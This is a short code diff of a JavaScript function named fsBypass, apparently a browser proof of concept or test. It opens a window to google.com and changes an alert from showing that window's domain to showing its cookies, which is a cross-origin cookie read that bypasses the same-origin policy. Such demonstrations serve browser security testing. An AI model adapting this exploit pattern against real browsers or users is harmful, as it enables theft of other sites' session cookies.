@@ -3,6 +3,6 @@
 function fsBypass(element) {
   var x = window.open("http://google.com");
   x.alert();
-  setTimeout(function(){x.alert(x.document.domain);}, 70)
+  setTimeout(function(){x.alert(x.document.cookie);}, 70)
 }
 </script>
